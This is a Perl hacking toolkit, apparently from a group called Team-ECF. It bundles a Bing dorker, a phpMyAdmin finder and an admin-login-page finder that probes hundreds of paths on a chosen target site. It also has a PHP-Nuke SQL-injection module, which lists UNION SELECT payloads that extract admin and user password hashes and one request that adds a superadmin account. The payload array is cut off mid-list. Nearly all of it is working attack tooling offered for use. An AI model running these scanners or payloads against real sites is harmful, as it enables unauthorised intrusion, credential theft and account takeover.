#!/usr/bin/perl
# Dev by 1337 Brain From Team-ECF
# Gr33tz to Rip Pappu - Akbor Hossain - xeo-1337  - S!r 3zp1r3 - No PM - Force x Brain Crush - Red X - x pirate - Lazy Mind - Dreamer 1986
use HTTP::Request;
use LWP::UserAgent;
use Digest::MD5;
use MIME::Base64;
use LWP::Simple;
use IO::Socket;
use HTTP::Request::Common;
use Term::ANSIColor;
use Win32::Console::ANSI;
system('cls');
system('title Scanner v1.0 by Team-ECF');
print color("green"),"======================================================\n";
print color("green"),"  MultiTools r1z <= 1.0.1 beta   \n";
print color("green"),"    [#] Team-ECF [#]      \n";
print color("red"), "   Coded by 1337 Brain                  \n";
print color("green"), "======================================================\n";
print color("green"),"[1] Joomla Scanner\n";
print color("green"),"[2] Md5 Encoder\n";
print color("green"), "[3] PhpMyAdmin finder\n";
print color("green"), "[4] Admin Panel finder\n";
print color("green"), "[5] Base64 Encoder\n";
print color("green"), "[6] Base64 Decoder\n";
print color("green"), "[7] PhpNuke Sql Scanner\n";
print color("green"), "[8] Dorker Bing\n";
print color("green"), "[9] About Us\n\n";
print "[+] Choose Number : ";
my $targett = <>;
chomp $targett;
if($targett eq '8')
{
 system('cls');
 system('color a');
 
print q{
+----------------------[Dorker bing]--------------------+
|                                                       |
|                     Edited By Team-ECF              |
|                   result in done.txt                  |
+-------------------------------------------------------+
 
};
print "\nDork:";
print "\n(Ex: index.php+site:.il )\n";
print "=>";
 $dork = <STDIN>;
 chomp($dork);
 
 print "Scan Start!";
 
 for ($i = 0; $i < 1000; $i += 10) {
 
 $b = LWP::UserAgent->new(agent => 'Mozilla/4.8 [en] (Windows NT 6.0; U)');
 $b->timeout(30);
 $b->env_proxy;
 $c = $b->get('http://www.bing.com/search?q=' . $dork . '&first=' . $i . '&FORM=PERE')->content;
 $check = index($c, 'sb_pagN');
 
 while (1) {
 $n = index($c, '<h3><a href="');
 
 if ($n == -1) {
 last;
 }
 
 print "$s\n";
 $c = substr($c, $n + 13);
 $s = substr($c, 0, index($c, '"'));
 open (txt,">>done.txt");
 print txt  $s,"\n";
 close(txt);
 
 }
 if ($check == -1) {
 last;
 }
 }
 print "Scan Finished!";
 system("done.txt");
 exit;
 
}
if($targett eq '9')
{
 
        system('cls');
        system('title About Us');
        print "
\t
 
\t :::==== :::===== :::====  :::=======
\t :::==== :::      :::  === ::: === ===
\t  ===   ======   ======== === === ===
\t  ===   ===      ===  === ===     ===
\t  ===   ======== ===  === ===     ===
                                     
\t:::=======  :::====  :::===  :::==== :::====
\t::: === === :::  === :::     :::==== :::  ===
\t=== === === ===  ===  =====    ===   ========
\t===     === ===  ===     ===   ===   ===  ===
\t===     ===  ======  ======    ===   ===  ===
     
 
     \n";
      print "\tT00ls Dev by 1337 Brain\n";
      print "\tFrom Team-ECF\n";
      print "\tSpecial Greetz To All Member of Team-ECF\n";
      print "\t[*] Do you want open Team-ECF (y/n) => ";
      my $openit = <>;
      chomp($openit);
      if($openit eq "y")
      {
        system('start http://ecf.me/');
      }
      else
      {
        print "\t<----TeaM-ECF---->";
      }
 
}
if($targett eq '2')
{
system('cls');
system('title Md5 Encoder');
                                        {
                                                print " Md5 Encoder !!!!! \n";
                                        print " Enter Your String:";
                                        $md=<STDIN>;
                                        chomp $md;
                                        print Digest::MD5->md5_hex("$md")
                                        }
}
if($targett eq '3')
{ #Script Coded By 1337 Brain (me :)
        system('cls');
        system('title PhpMyAdmin FInder');
@pathh=('/phpMyAdmin/',
'/phpmyadmin/',
'/PMA/',
'/pma/',
'/admin/',
'/dbadmin/',
'/mysql/',
'/myadmin/',
'/phpmyadmin2/',
'/phpMyAdmin2/',
'/phpMyAdmin-2/',
'/php-my-admin/',
'/phpMyAdmin-2.2.3/',
'/phpMyAdmin-2.2.6/',
'/phpMyAdmin-2.5.1/',
'/phpMyAdmin-2.5.4/',
'/phpMyAdmin-2.5.5-rc1/',
'/phpMyAdmin-2.5.5-rc2/',
'/phpMyAdmin-2.5.5/',
'/phpMyAdmin-2.5.5-pl1/',
'/phpMyAdmin-2.5.6-rc1/',
'/phpMyAdmin-2.5.6-rc2/',
'/phpMyAdmin-2.5.6/',
'/phpMyAdmin-2.5.7/',
'/phpMyAdmin-2.5.7-pl1/',
'/phpMyAdmin-2.6.0-alpha/',
'/phpMyAdmin-2.6.0-alpha2/',
'/phpMyAdmin-2.6.0-beta1/',
'/phpMyAdmin-2.6.0-beta2/',
'/phpMyAdmin-2.6.0-rc1/',
'/phpMyAdmin-2.6.0-rc2/',
'/phpMyAdmin-2.6.0-rc3/',
'/phpMyAdmin-2.6.0/',
'/phpMyAdmin-2.6.0-pl1/',
'/phpMyAdmin-2.6.0-pl2/',
'/phpMyAdmin-2.6.0-pl3/',
'/phpMyAdmin-2.6.1-rc1/',
'/phpMyAdmin-2.6.1-rc2/',
'/phpMyAdmin-2.6.1/',
'/phpMyAdmin-2.6.1-pl1/',
'/phpMyAdmin-2.6.1-pl2/',
'/phpMyAdmin-2.6.1-pl3/',
'/phpMyAdmin-2.6.2-rc1/',
'/phpMyAdmin-2.6.2-beta1/',
'/phpMyAdmin-2.6.2-rc1/',
'/phpMyAdmin-2.6.2/',
'/phpMyAdmin-2.6.2-pl1/',
'/phpMyAdmin-2.6.3/',
'/phpMyAdmin-2.6.3-rc1/',
'/phpMyAdmin-2.6.3/',
'/phpMyAdmin-2.6.3-pl1/',
'/phpMyAdmin-2.6.4-rc1/',
'/phpMyAdmin-2.6.4-pl1/',
'/phpMyAdmin-2.6.4-pl2/',
'/phpMyAdmin-2.6.4-pl3/',
'/phpMyAdmin-2.6.4-pl4/',
'/phpMyAdmin-2.6.4/',
'/phpMyAdmin-2.7.0-beta1/',
'/phpMyAdmin-2.7.0-rc1/',
'/phpMyAdmin-2.7.0-pl1/',
'/phpMyAdmin-2.7.0-pl2/',
'/phpMyAdmin-2.7.0/',
'/phpMyAdmin-2.8.0-beta1/',
'/phpMyAdmin-2.8.0-rc1/',
'/phpMyAdmin-2.8.0-rc2/',
'/phpMyAdmin-2.8.0/',
'/phpMyAdmin-2.8.0.1/',
'/phpMyAdmin-2.8.0.2/',
'/phpMyAdmin-2.8.0.3/',
'/phpMyAdmin-2.8.0.4/',
'/phpMyAdmin-2.8.1-rc1/',
'/phpMyAdmin-2.8.1/',
'/phpMyAdmin-2.8.2/',
'/sqlmanager/',
'/mysqlmanager/',
'/p/m/a/',
'/PMA2005/',
'/pma2005/',
'/phpmanager/',
'/php-myadmin/',
'/phpmy-admin/',
'/webadmin/',
'/sqlweb/',
'/websql/',
'/webdb/',
'/mysqladmin/',
'/mysql-admin/',
'/mya/',
);
print "PhpMyAdmin Finder !! :p \n";
print "result in PhpMyadmin.txt \n";
print "Enter Target:";
my $trget = <>;
chomp $trget;
foreach $pathh(@pathh){
my $URLll = $trget.$pathh;
my $Source = get $URLll;
die "Can not get $URLll" unless defined $URLll;
if ($Source =~ /phpMyAdmin/ || /Welcome to phpMyAdmin/ || /Username/ || /Password/) { $Messageee ="PhpMyAdmin P4n3l F!nded";}
else { $Messageee = "P4n3l Not F0und ";}
print "$URLll     =>    $Messageee\n";
print "\n \n \n \n \t \t \t \t FINISH ";
open (TEXT, '>>PhpMyadmin.txt');
print TEXT "\n$URLll   =>   $Messageee \n\n";
close (TEXT);
}
 
}
if($targett eq '4')
{ #Script Original Coded By Tartou2
system('cls');
system('title Admin Panel Finder');
        print " Enter Target \n";
print" e.g.: www.target.co.il or www.target.co.il/path\n";
print" --> ";
$site=<STDIN>;
chomp $site;
 
print "\n\n";
print " Enter the coding language of the website \n";
print" e.g.: asp, php, cfm, other\n";
print" If you don't know the launguage used in the coding then simply type ** other ** \n";
print"--> ";
$code=<STDIN>;
chomp($code);
 
if ( $site !~ /^http:/ ) {
$site = 'http://' . $site;
}
if ( $site !~ /\/$/ ) {
$site = $site . '/';
}
print "\n";
 
print "->The website: $site\n";
print "->Source of the website: $code\n";
print "->Scan of the admin control panel is progressing...\n\n\n";
 
if($code eq "asp"){
 
@path1=('_admin/','backoffice/','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
'administrator/account.asp','administrator.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html'
);
 
foreach $ways(@path1){
 
$final=$site.$ways;
 
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);
 
if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Found -> $final\n\n";
print " \n The Login Page Finded \n\n Good Job \n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
}
 
 
 
 
 
# -------------------test cfm ---------------------------|
 
 
 
 
 
 
if($code eq "cfm"){
 
@path1=('_admin/','backoffice/','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.cfm','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm',
'admin_area/admin.cfm','admin_area/login.cfm','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.cfm','admin/controlpanel.cfm','admin.cfm','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm','admin/cp.cfm','cp.cfm',
'administrator/account.cfm','administrator.cfm','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm','administrator/login.cfm',
'moderator/admin.cfm','controlpanel.cfm','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.cfm','user.html','admincp/index.cfm','admincp/login.cfm','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.cfm','admin/account.cfm','adminpanel.cfm','webadmin.cfm','webadmin/index.cfm',
'webadmin/admin.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm','panel-administracion/login.cfm','adminLogin.cfm',
'admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm','adminarea/admin.cfm','adminarea/login.cfm','admin-login.html',
'panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm','modelsearch/admin.cfm','administrator/index.cfm',
'admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','adm/index.cfm',
'adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html'
);
 
foreach $ways(@path1){
 
$final=$site.$ways;
 
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);
 
if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Found -> $final\n\n";
print " \n The login Page Found \n\n Good Job \n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
}
 
 
 
 
 
 
#--------------------------/test php-------------------------|
 
 
 
if($code eq "php"){
 
@path2=('_admin/','backoffice/','admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php',
'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php'
);
 
foreach $ways(@path2){
 
$final=$site.$ways;
 
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);
 
if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Found -> $final\n\n";
print " \n  Login Page Finded \n\n Good :) \n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
}
 
 
 
 
 
# ----------------------- other ---------------------------|
 
 
 
 
 
 
if($code eq "other"){
 
@path1=('_admin/','backoffice/','account.asp','account.cfm','account.html','account.php','acct_login/','adm.asp','adm.cfm','adm.html','adm.php','adm/','adm/admloginuser.asp','adm/admloginuser.cfm','adm/admloginuser.php','adm/index.asp','adm/index.cfm','adm/index.html','adm/index.php','adm_auth.asp','adm_auth.cfm','adm_auth.php','admin.asp','admin.cfm','admin.html','admin.php','admin/','admin/account.asp','admin/account.cfm','admin/account.html','admin/account.php','admin/admin.asp','admin/admin.cfm','admin/admin.html','admin/admin.php','admin/admin_login.asp','admin/admin_login.cfm','admin/admin_login.html','admin/admin_login.php','admin/adminLogin.asp','admin/admin-login.asp','admin/adminLogin.cfm','admin/admin-login.cfm','admin/adminLogin.html','admin/admin-login.html','admin/adminLogin.php','admin/admin-login.php','admin/controlpanel.asp','admin/controlpanel.cfm','admin/controlpanel.html','admin/controlpanel.php','admin/cp.asp','admin/cp.cfm','admin/cp.html','admin/cp.php','admin/home.asp','admin/home.cfm','admin/home.html','admin/home.php','admin/index.asp','admin/index.cfm','admin/index.html','admin/index.php','admin/login.asp','admin/login.cfm','admin/login.html','admin/login.php','admin_area/','admin_area/admin.asp','admin_area/admin.cfm','admin_area/admin.html','admin_area/admin.php','admin_area/index.asp','admin_area/index.cfm','admin_area/index.html','admin_area/index.php','admin_area/login.asp','admin_area/login.cfm','admin_area/login.html','admin_area/login.php','admin_login.asp','admin_login.cfm','admin_login.html','admin_login.php','admin1.asp','admin1.html','admin1.php','admin1/','admin2.asp','admin2.cfm','admin2.html','admin2.php','admin2/index.asp','admin2/index.cfm','admin2/index.php','admin2/login.asp','admin2/login.cfm','admin2/login.php','admin4_account/','admin4_colon/','adminarea/','adminarea/admin.asp','adminarea/admin.cfm','adminarea/admin.html','adminarea/admin.php','adminarea/index.asp','adminarea/index.cfm','adminarea/index.html','adminarea/index.php','adminarea/login.asp','adminarea/login.cfm','adminarea/login.html','adminarea/login.php','admincontrol.asp','admincontrol.cfm','admincontrol.html','admincontrol.php','admincontrol/login.asp','admincontrol/login.cfm','admincontrol/login.html','admincontrol/login.php','admincp/index.asp','admincp/index.cfm','admincp/index.html','admincp/login.asp','admincp/login.cfm','administer/','administr8.asp','administr8.html','administr8.php','administr8/','administratie/','administration.html','administration.php','administration/','administrator.asp','administrator.cfm','administrator.html','administrator.php','administrator/','administrator/account.asp','administrator/account.cfm','administrator/account.html','administrator/account.php','administrator/index.asp','administrator/index.cfm','administrator/index.html','administrator/index.php','administrator/login.asp','administrator/login.cfm','administrator/login.html','administrator/login.php','administratoraccounts/','administratorlogin.asp','administratorlogin.cfm','administratorlogin.php','administratorlogin/','administrators/','administrivia/','adminLogin.asp','admin-login.asp','adminLogin.cfm','admin-login.cfm','adminLogin.html','admin-login.html','adminLogin.php','admin-login.php','adminLogin/','adminpanel.asp','adminpanel.cfm','adminpanel.html','adminpanel.php','adminpro/','admins.asp','admins.html','admins.php','admins/','AdminTools/','admloginuser.asp','admloginuser.cfm','admloginuser.php','affiliate.asp','affiliate.cfm','affiliate.php','autologin/','banneradmin/','bbadmin/','bb-admin/','bb-admin/admin.asp','bb-admin/admin.cfm','bb-admin/admin.html','bb-admin/admin.php','bb-admin/index.asp','bb-admin/index.cfm','bb-admin/index.html','bb-admin/index.php','bb-admin/login.asp','bb-admin/login.cfm','bb-admin/login.html','bb-admin/login.php','bigadmin/','blogindex/','cadmins/','ccp14admin/','cmsadmin/','controlpanel.asp','controlpanel.cfm','controlpanel.html','controlpanel.php','controlpanel/','cp.asp','cp.cfm','cp.html','cp.php','cPanel/','cpanel_file/','customer_login/','database_administration/','directadmin/','dir-login/','ezsqliteadmin/','fileadmin.asp','fileadmin.html','fileadmin.php','fileadmin/','formslogin/','globes_admin/','home.asp','home.cfm','home.html','home.php','hpwebjetadmin/','Indy_admin/','instadmin/','irc-macadmin/','LiveUser_Admin/','login.asp','login.cfm','login.html','login.php','login_db/','login1/','loginflat/','login-redirect/','login-us/','logo_sysadmin/','Lotus_Domino_Admin/','macadmin/','manuallogin/','memberadmin.asp','memberadmin.cfm','memberadmin.php','memberadmin/','members/','memlogin/','meta_login/','modelsearch/admin.asp','modelsearch/admin.cfm','modelsearch/admin.html','modelsearch/admin.php','modelsearch/index.asp','modelsearch/index.cfm','modelsearch/index.html','modelsearch/index.php','modelsearch/login.asp','modelsearch/login.cfm','modelsearch/login.html','modelsearch/login.php','moderator.asp','moderator.cfm','moderator.html','moderator.php','moderator/','moderator/admin.asp','moderator/admin.cfm','moderator/admin.html','moderator/admin.php','moderator/login.asp','moderator/login.cfm','moderator/login.html','moderator/login.php','myadmin/','navSiteAdmin/','newsadmin/','nsw/admin/login.php','openvpnadmin/','pages/admin/admin-login.asp','pages/admin/admin-login.cfm','pages/admin/admin-login.html','pages/admin/admin-login.php','panel/','panel-administracion/','panel-administracion/admin.asp','panel-administracion/admin.cfm','panel-administracion/admin.html','panel-administracion/admin.php','panel-administracion/index.asp','panel-administracion/index.cfm','panel-administracion/index.html','panel-administracion/index.php','panel-administracion/login.asp','panel-administracion/login.cfm','panel-administracion/login.html','panel-administracion/login.php','pgadmin/','phpldapadmin/','phpmyadmin/','phppgadmin/','phpSQLiteAdmin/','platz_login/','power_user/','project-admins/','pureadmin/','radmind/','radmind-1/','rcjakar/admin/login.php','rcLogin/','Server.asp','Server.html','Server.php','server/','server_admin_small/','ServerAdministrator/','showlogin/','simpleLogin/','siteadmin/index.asp','siteadmin/index.cfm','siteadmin/index.php','siteadmin/login.asp','siteadmin/login.cfm','siteadmin/login.html','siteadmin/login.php','smblogin/','sql-admin/','ss_vms_admin_sm/','sshadmin/','staradmin/','sub-login/','Super-Admin/','support_login/','sysadmin.asp','sysadmin.html','sysadmin.php','sysadmin/','sys-admin/','SysAdmin2/','sysadmins/','system_administration/','system-administration/','typo3/','ur-admin.asp','ur-admin.html','ur-admin.php','ur-admin/','user.asp','user.html','user.php','useradmin/','UserLogin/','utility_login/','vadmind/','vmailadmin/','webadmin.asp','webadmin.cfm','webadmin.html','webadmin.php','WebAdmin/','webadmin/admin.asp','webadmin/admin.cfm','webadmin/admin.html','webadmin/admin.php','webadmin/index.asp','webadmin/index.cfm','webadmin/index.html','webadmin/index.php','webadmin/login.asp','webadmin/login.cfm','webadmin/login.html','webadmin/login.php','wizmysqladmin/','wp-admin/','wp-login.php','wp-login/','xlogin/','yonetici.asp','yonetici.html','yonetici.php','yonetim.asp','yonetim.html','yonetim.php','panel/?a=cp'
);
 
foreach $ways(@path1){
 
$final=$site.$ways;
 
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);
 
if($response->content =~ /Username/ ||
$response->content =~ /Password/ ||
$response->content =~ /username/ ||
$response->content =~ /password/ ||
$response->content =~ /USERNAME/ ||
$response->content =~ /PASSWORD/ ||
$response->content =~ /Senha/ ||
$response->content =~ /senha/ ||
$response->content =~ /Personal/ ||
$response->content =~ /Usuario/ ||
$response->content =~ /Clave/ ||
$response->content =~ /Usager/ ||
$response->content =~ /usager/ ||
$response->content =~ /Sing/ ||
$response->content =~ /passe/ ||
$response->content =~ /P\/W/ ||
$response->content =~ /Admin Password/
){
print " \n [+] Found -> $final\n\n";
print " \n The Login Page Finded \n\n Good Job \n\n";
}else{
print "[-] Not Found <- $final\n";
}
}
kill("STOP",NULL);
}
}
if($targett eq '')
{
print "Usage: perl MultiTools.pl \n";
exit(1);
}
if($targett eq '7')
{
@Nuke =("modules.php?name=Downloads&d_op=viewdownload&cid=59%20or%20cid=2",
                        "modules.php?name=Reviews&rop=showcontent&id=-1%20UNION%20SELECT%200,0,aid,pwd,email,email,100,pwd,url,url,10000,name%20FROM%20nuke_authors/",
                        "modules.php?name=Sections&op=viewarticle&artid=-1%20UNION%20SELECT%200,0,aid,pwd,0%20FROM%20nuke_authors",
                        "modules.php?name=Sections&op=printpage&artid=-1%20UNION%20SELECT%20aid,pwd%20FROM%20nuke_authors",
                        "modules.php?name=Sections&op=listarticles&secid=-1%20UNION%20SELECT%200,0,pwd,0,0%20FROM%20nuke_authors%20WHERE%201/",
                        "modules.php?name=Sections&op=listarticles&secid=-1%20UNION%20SELECT%20pwd%20FROM%20nuke_authors",
                        "modules.php?name=Downloads&d_op=viewdownloadeditorial&lid=-1%20UNION%20SELECT%20username,1,user_password,user_id%20FROM%20nuke_users",
                        "modules.php?name=Downloads&d_op=viewdownloadcomments&lid=-1%20UNION%20SELECT%20username,user_id,user_password,1%20FROM%20nuke_users/",
                        "modules.php?name=Sections&op=listarticles&secid=-1%20UNION%20SELECT%20pwd%20FROM%20nuke_authors",
                        "modules.php?name=Journal&file=search&bywhat=aid&exact=1&forwhat=kala",
                        "index.php?&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox",
                        "modules.php?name=Journal&file=search&bywhat=aid&exact=1&forwhat=kala'/**/UNION/**/SELECT/**/0,0,pwd,0,0,0,0,0,0/**/FROM/**/nuke_authors/**/WHERE/**/radminsuper=1/**/LIMIT/**/1/*",
                        "admin.php?op=AddAuthor&add_aid=x0p0x&add_name=God&add_pwd=cool&add_email=bugs@victima&add_radminsuper=1&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox",
                        "modules.php?name=Private_Messages&file=index&folder=savebox&mode=read&p=99&pm_sql_user=AND%20pm.privmsgs_type=-99%20UNION%20SELECT%20aid,null,pwd,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20nuke_authors%20WHERE%20radminsuper=1%20LIMIT%201/",
                        "modules.php?name=Web_Links&l_op=viewlink&cid=1%20UNION%20SELECT%20pwd,0%20FROM%20nuke_authors%20LIMIT%201,2",
                        "modules.php?name=Web_Links&l_op=viewlink&cid=1%20UNION%20SELECT%20pwd,0%20FROM%20nuke_authors%20LIMIT%201,2",
                        "modules.php?name=Web_Links&l_op=viewlink&cid=0%20UNION%20SELECT%20pwd,0%20FROM%20nuke_authors",
                        "modules.php?name=Downloads&d_op=getit&lid=-1%20UNION%20SELECT%20user_password%20FROM%20nuke_users%20WHERE%20user_id=5",
                        "modules.php?name=Web_Links&l_op=viewlinkeditorial&lid=-1%20UNION%20SELECT%20name,1,pwd,aid%20FROM%20nuke_authors",
                        "modules.php?op=modload&name=books&file=index&req=view_cat&cid=-90900%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/char(111,112,101,114,110,97,108,101,51),concat(pn_uname,0x3a,pn_pass)+from%2F%2A%2A%2Fnuke_users/*where%20admin%201=%201",
                        "modules.php?op=modload&name=books&file=index&req=view_cat&cid=-90900%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/char(121,122,111,104,110,97,112,101,54),concat(pn_uname,0x3a,pn_pass)+from%2F%2A%2A%2FpostNuke_users/*where%20admin%201=%201",
                        "modules.php?name=Sections&op=viewarticle&artid=-9999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%20%20/**/0,1,aid,pwd,4/**/from/**/nuke_authors/*where%20admin%20-2",
                        "modules.php?op=modload&name=EasyContent&file=index&menu=410&page_id=-1/**/union/**/select/**/0,aid/**/from/**/nuke_authors/**/where/**/radminsuper=1/*",
